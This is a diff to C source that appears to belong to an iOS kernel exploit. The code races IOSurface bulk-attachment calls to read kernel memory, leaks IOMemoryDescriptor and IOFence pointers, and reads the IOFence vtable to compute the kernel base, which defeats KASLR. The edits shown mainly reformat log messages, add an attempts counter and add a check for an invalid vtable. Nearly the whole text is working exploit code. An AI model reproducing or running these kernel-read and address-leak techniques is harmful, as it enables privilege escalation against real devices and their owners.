@@ -11,7 +11,7 @@
 #include "offsets.h"
 
 static io_connect_t g_surface_conn = 0;
-static void * g_surface_kernel_ptr = NULL;
+static uint64_t g_surface_kernel_ptr = 0;
 static void * g_surface_buffer = NULL;
 static uint32_t g_surface_id_for_arbitrary_read = 0;
 
@@ -136,15 +136,18 @@ void* kernel_read_surface_bulk_race_thread(void * _args) {
 
 	iosurface_utils_set_bulk_attachment_flag(input_buffer, 1);
 
-	printf("[INFO]:block to leak: %p\n", *(void**)input_buffer);
+	printf("[INFO]: block to leak: %p\n", *(void**)input_buffer);
 
+    int attempts = 0;
 	while(!*(int*)should_stop) {
 
 		if (counter++ >= 0x10000)
 		{
-			printf("[INFO]:timeout leak\n");
+			printf("[INFO]: timeout leak\n");
 			break;
 		}
+        
+        attempts++;
 
 		ret = iosurface_utils_set_bulk_attachment(g_surface_conn, g_surface_id_for_arbitrary_read,
 			input_buffer);
@@ -167,21 +170,25 @@ void* kernel_read_surface_bulk_race_thread(void * _args) {
 		{
 			if (args->mask && ((*(uint64_t*)(output_buffer + 0x20) & args->mask) != (args->expected_value & args->mask)))
 			{
-				printf("[INFO]:0x%llx & 0x%llx (0x%llx) != 0x%llx & 0x%llx (0x%llx)\n",
+				printf("[WARNING]: 0x%llx & 0x%llx (0x%llx) != expected value 0x%llx & 0x%llx (0x%llx)\n",
 					*(uint64_t*)(output_buffer + 0x20), args->mask,
 					*(uint64_t*)(output_buffer + 0x20) & args->mask,
 					args->expected_value, args->mask,
 					args->expected_value & args->mask);
-				continue;
-			}
+                
+                continue;
+            } else {
+                printf("[INFO]: expected value: 0x%llx matches output_buffer\n", *(uint64_t*)(output_buffer + 0x20));
+            }
 
 			/* This value means the race failed. */
 			if (*(unsigned int*)(output_buffer + 0x20) == 0xf6000)
 			{
+                printf("[ERROR]: race failed.\n");
 				continue;
 			}
 
-			printf("[INFO]:Leaked IOMemoryDescriptor: %p\n", *(void**)(output_buffer+0x20));
+			printf("[INFO]: Leaked IOMemoryDescriptor: %p\n", *(void**)(output_buffer+0x20));
 			*args->out_value = *(uint64_t*)(output_buffer + 0x20);
 			break;
 		}
@@ -248,7 +255,7 @@ kern_return_t kernel_read_read_address(void * kernel_ptr, uint64_t * value, uint
 	for(i = 0; i < NUMBER_OF_BULK_RACERS; ++i) {
 		if (pthread_create(&(bulk_setter[i]), NULL, kernel_read_surface_bulk_race_thread, &args))
 		{
-			printf("[ERROR]: creating bulk setter thread");
+			printf("[ERROR]: creating bulk setter thread\n");
 			ret = KERN_ABORTED;
 			goto cleanup;
 		}
@@ -296,16 +303,18 @@ kern_return_t kernel_read_leak_kernel_base(uint64_t * kernel_base) {
 		0, 0);
 	if (KERN_SUCCESS != ret)
 	{
-		printf("[ERROR]: leaking IOFence object");
+		printf("[ERROR]: leaking IOFence object\n");
 		goto cleanup;
 	}
 
-	printf("[INFO]:Before ORing: %p\n", (void*)value);
+	printf("[INFO]: Before ORing: %p\n", (void*)value);
 
 	value |= 0xfffffff000000000;
 	iofence = (void*)value;
 
-	printf("[INFO]:IOFence: %p\n", iofence);
+	printf("[INFO]: IOFence: %p\n", iofence);
+    printf("[INFO]: IOFence's vtable offset is: 0x%llx\n", OFFSET(iofence_vtable_offset));
+
 	//printf("[INFO]:IOFence, real: %p", (void*)r64(apple_ave_pwn_get_bad_surface_kernel_ptr() + 0x210));
 
 	/* Read the vtable from the IOFence object */
@@ -319,7 +328,17 @@ kern_return_t kernel_read_leak_kernel_base(uint64_t * kernel_base) {
 	value |= 0xfffffff000000000;
 	iofence_vtable = value;
 
-	printf("[INFO]: IOFence's vtable: %llx\n", iofence_vtable);
+
+    // Check IOFence's vtable
+    if(iofence_vtable == 0xfffffff000000000) {
+        printf("[ERROR]: got an invalid IOFence vtable address: 0x%llx\n", iofence_vtable);
+        printf("[ERROR]: reboot and try again.\n");
+        ret = KERN_FAILURE;
+        goto cleanup;
+    }
+               
+    printf("[INFO]: IOFence's vtable: 0x%llx\n", iofence_vtable);
+               
 	//printf("[INFO]:IOFence's vtable, real: %p", (void*)r64(r64(apple_ave_pwn_get_bad_surface_kernel_ptr() + 0x210)));
 
 	*kernel_base = (iofence_vtable - OFFSET(iofence_vtable_offset));
@@ -369,7 +388,7 @@ kern_return_t kernel_read_init() {
 		goto cleanup;
 	}
 
-	printf("[INFO]:kernel pointer of IOSurface object %d is %p\n", g_surface_id_for_arbitrary_read, g_surface_kernel_ptr);
+	printf("[INFO]:kernel pointer of IOSurface object %d is %llu\n", g_surface_id_for_arbitrary_read, g_surface_kernel_ptr);
 
 cleanup:
 	if (KERN_SUCCESS != ret)
